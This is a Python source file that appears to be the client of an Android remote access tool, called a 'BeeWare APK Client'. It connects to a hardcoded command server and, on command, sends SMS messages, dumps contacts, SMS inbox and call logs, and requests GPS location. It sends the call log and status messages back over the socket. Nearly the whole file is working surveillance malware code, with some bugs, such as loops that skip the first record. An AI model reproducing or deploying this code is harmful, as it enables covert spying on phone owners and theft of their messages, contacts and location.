import socket
import argparse
from jnius import autoclass, cast
from android import activity

ContactsContract = autoclass('android.provider.ContactsContract')
Uri = autoclass('android.net.Uri')
SmsManager = autoclass('android.telephony.SmsManager')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
LocationManager = autoclass('android.location.LocationManager')
LocationListener = autoclass('android.location.LocationListener')
Looper = autoclass('android.os.Looper')
Geocoder = autoclass('android.location.Geocoder')

SERVER_IP = '10.0.1.33'
SERVER_PORT = 9999

def connect_to_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock

def send_sms(target, message):
    sms_manager = SmsManager.getDefault()
    sms_manager.sendTextMessage(target, None, message, None, None)
    print(f'SMS sent to {target}')
    return "[+] SMS sent - Transmission successful"

def dump_contacts():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = ContactsContract.Contacts.CONTENT_URI
    cursor = content_resolver.query(uri, None, None, None, None)

    contacts = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
            contacts.append(name)
    cursor.close()
    contacts_list = '\n'.join(contacts)
    contacts_file = f"contacts_dump_{SERVER_IP}.txt"
    with open(contacts_file, "w") as file:
        file.write(contacts_list)
    return f"[*] Fetching {len(contacts)} contacts into list\n[*] Contacts list saved to: {contacts_file}"

def dump_sms():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://sms/inbox")
    cursor = content_resolver.query(uri, None, None, None, None)

    sms_list = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            body = cursor.getString(cursor.getColumnIndex("body"))
            address = cursor.getString(cursor.getColumnIndex("address"))
            sms_list.append(f'From: {address}, Message: {body}')
    cursor.close()
    sms_messages = '\n'.join(sms_list)
    sms_file = f"sms_dump_{SERVER_IP}.txt"
    with open(sms_file, "w") as file:
        file.write(sms_messages)
    return f"[*] Fetching {len(sms_list)} sms messages\n[*] SMS messages saved to: {sms_file}"

def wlan_geolocate():
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    location_manager = cast(LocationManager, context.getSystemService(Context.LOCATION_SERVICE))
    location_listener = LocationListener()

    def on_location_changed(location):
        latitude = location.getLatitude()
        longitude = location.getLongitude()
        google_maps_url = f"https://maps.google.com/?q={latitude},{longitude}"
        print(f"Current Location: {latitude}, {longitude}\nGoogle Maps: {google_maps_url}")
        return f"Current Location: {latitude}, {longitude}\nGoogle Maps: {google_maps_url}"

    def on_provider_disabled(provider):
        pass

    def on_provider_enabled(provider):
        pass

    def on_status_changed(provider, status, extras):
        pass

    location_listener.onLocationChanged = on_location_changed
    location_listener.onProviderDisabled = on_provider_disabled
    location_listener.onProviderEnabled = on_provider_enabled
    location_listener.onStatusChanged = on_status_changed

    location_manager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, location_listener, Looper.getMainLooper())

def dump_call_log():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://call_log/calls")
    cursor = content_resolver.query(uri, None, None, None, None)

    call_log = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            number = cursor.getString(cursor.getColumnIndex("number"))
            call_type = cursor.getString(cursor.getColumnIndex("type"))
            date = cursor.getString(cursor.getColumnIndex("date"))
            duration = cursor.getString(cursor.getColumnIndex("duration"))
            call_log.append(f'Number: {number}, Type: {call_type}, Date: {date}, Duration: {duration}')
    cursor.close()
    return '\n'.join(call_log)

def main():
    parser = argparse.ArgumentParser(description='BeeWare APK Client')
    parser.add_argument('command', choices=['send_sms', 'dump_contacts', 'dump_sms', 'dump_call_log', 'wlan_geolocate'])
    parser.add_argument('-d', '--destination', help='Target phone number')
    parser.add_argument('-t', '--text', help='SMS message')
    args = parser.parse_args()

    sock = connect_to_server()

    if args.command == 'send_sms':
        if args.destination and args.text:
            response = send_sms(args.destination, args.text)
            sock.sendall(response.encode())
        else:
            print('Target phone number and SMS message are required for send_sms command')
    elif args.command == 'dump_contacts':
        response = dump_contacts()
        sock.sendall(response.encode())
    elif args.command == 'dump_sms':
        response = dump_sms()
        sock.sendall(response.encode())
    elif args.command == 'wlan_geolocate':
        response = wlan_geolocate()
        sock.sendall(response.encode())
    elif args.command == 'dump_call_log':
        call_log = dump_call_log()
        sock.sendall(call_log.encode())

    sock.close()

if __name__ == '__main__':
    main()
